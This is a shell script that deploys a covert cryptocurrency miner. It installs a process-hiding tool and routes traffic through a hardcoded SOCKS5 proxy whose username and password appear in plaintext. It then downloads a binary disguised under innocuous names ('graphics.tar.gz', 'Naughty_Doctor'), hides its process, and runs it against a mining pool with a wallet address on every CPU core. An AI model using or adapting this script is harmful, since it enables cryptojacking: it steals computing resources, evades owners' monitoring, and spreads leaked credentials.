#!/bin/sh

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 3.16.66.235:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor
chmod +x Naughty_Doctor

#unset LD_PRELOAD
#unset LD_PRELOAD_ENV
#unset LD_LIBRARY_PATH

ph add Naughty_Doctor

./Naughty_Doctor --disable-gpu --algorithm ghostrider --pool na-rtm.pool-server.com:3008 --wallet RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.NaughtyDoctor --proxy mikrotik999:Elibawnos@3.16.66.235:1080 --cpu-threads $num_of_cores
